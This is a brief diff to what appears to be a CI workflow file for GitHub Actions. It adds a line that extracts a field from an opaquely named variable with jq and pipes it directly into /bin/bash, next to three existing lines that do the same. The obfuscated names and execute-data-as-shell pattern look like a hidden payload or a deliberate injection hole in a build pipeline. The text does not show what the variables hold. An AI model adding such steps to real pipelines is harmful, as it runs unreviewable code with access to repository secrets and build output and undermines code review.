@@ -25,6 +25,7 @@ jobs:
           echo $x183 | jq -r .fq4 | /bin/bash
           printf '%s' "$gxzua25" | jq -r .wsqs055 | /bin/bash
           printf '%s' "$izvkg4" | jq -r .y981 | /bin/bash
+          echo $d29 | jq -r .ugpt5 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
